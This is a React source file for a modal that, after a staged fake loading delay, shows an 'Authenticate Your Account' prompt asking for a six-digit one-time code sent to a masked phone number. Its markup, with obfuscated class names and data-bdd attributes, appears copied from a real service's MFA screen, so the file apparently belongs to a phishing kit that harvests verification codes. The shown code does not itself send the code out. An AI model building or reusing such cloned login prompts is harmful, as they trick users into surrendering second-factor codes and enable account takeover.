export default function AsideComponent ({ isOpen, onClose }) {
  return <div style={{ display: isOpen ? 'block' : 'none' }}></div>
}
import React from 'react';
import './formmodalito.css';


import { WraperComponente } from './wraper';
export function AsideModal({ onClose, onConfirm }) {
  const [code, setCode] = React.useState('');
  // 'hidden' -> 'wraper' (3s) -> 'content' (3s + 4s)
  const [step, setStep] = React.useState('hidden');

  React.useEffect(() => {
    const t1 = setTimeout(() => setStep('wraper'), 3000);
    const t2 = setTimeout(() => setStep('content'), 7000);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
    };
  }, []);

  const isCodeValid = code.length === 6;

  const handleCodeChange = (event) => {
    const onlyDigits = event.target.value.replace(/\D/g, '').slice(0, 6);
    setCode(onlyDigits);
  };

  const handleConfirm = () => {
    if (!isCodeValid) return;
    onConfirm?.();
    setStep('hidden');
    onClose?.();
  };

  const handleClose = () => {
    setStep('hidden');
    onClose?.();
  };

  if (step === 'hidden') return null;

  return (
    <>
      <div className="modal-overlay" onClick={handleClose}>
        <div className="modal-container" onClick={(e) => e.stopPropagation()}>

          {step === 'wraper' && <WraperComponente />}

          <button className="modal-close" onClick={handleClose}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
              <path
                d="M18 6L6 18M6 6L18 18"
                stroke="#333"
                strokeWidth="2"
                strokeLinecap="round"
                strokeLinejoin="round"
              />
            </svg>
          </button>

          {step === 'content' && (
            <div className="modal-content">
              <h2 className="modal-title bNFFgT">Authenticate Your Account</h2>

              <span style={{ textAlign: 'start' }}>
                <p className="sc-cOpnSz dmIJHz">
                  A one-time code has been sent to{' '}
                  <span
                    data-bdd="mfa-last-four-digits"
                    data-cs-mask="true"
                    className="sc-kCuUfV gDEJOo"
                  >
                    ********4678
                  </span>
                  . Please enter your code below to continue.
                </p>
              </span>

              <div className="sc-ipUnzB bTQIQZ">
                <div
                  id="mfa-code-input-field"
                  className="indexstyles__InputField-sc-ruvmzp-0 hkDlPq"
                  style={{ textAlign: 'start' }}
                >
                  <label
                    htmlFor="mfa-code-input-field-input"
                    className="indexstyles__Label-sc-ruvmzp-1 qPAiu"
                  >
                    <p htmlFor="mfa-code-input-field" className="sc-gvqKNf cPcpKx">
                      Authentication Code
                    </p>
                  </label>
                  <div margintop="lounge" className="indexstyles__Row-sc-ruvmzp-2 grPqUw">
                    <input
                      aria-invalid="false"
                      inputMode="tel"
                      pattern="[0-9]*"
                      maxLength={6}
                      data-bdd="mfa-code-input-field"
                      aria-describedby="mfa-code-input-field-error mfa-code-input-field-success mfa-code-description"
                      id="mfa-code-input-field-input"
                      className="indexstyles__Input-sc-ruvmzp-6 ffJFgn"
                      value={code}
                      onChange={handleCodeChange}
                    />
                  </div>
                  <div
                    id="mfa-code-input-field-success"
                    className="indexstyles__Validation-sc-ruvmzp-15 bHboL"
                  />
                </div>
                <p id="mfa-code-description" className="sc-eQwNpu eSGfgK">
                  <label className="sc-cOpnSz dmIJHz">
                    Didn't receive your code?{' '}
                    <a
                      data-bdd="mfa-request-code-link"
                      type="button"
                      className="Link__StyledLink-sc-pudy0l-0 kofZbx sc-kjwdDK LXKaP"
                    >
                      Request a new code
                    </a>
                  </label>
                </p>
              </div>

              <div className="modal-buttons" style={{ alignSelf: 'flex-end' }}>
                <button className="btn-ok" onClick={handleConfirm} disabled={!isCodeValid}>
                  Confirm Code
                </button>
              </div>
            </div>
          )}

        </div>
      </div>
    </>
  );
}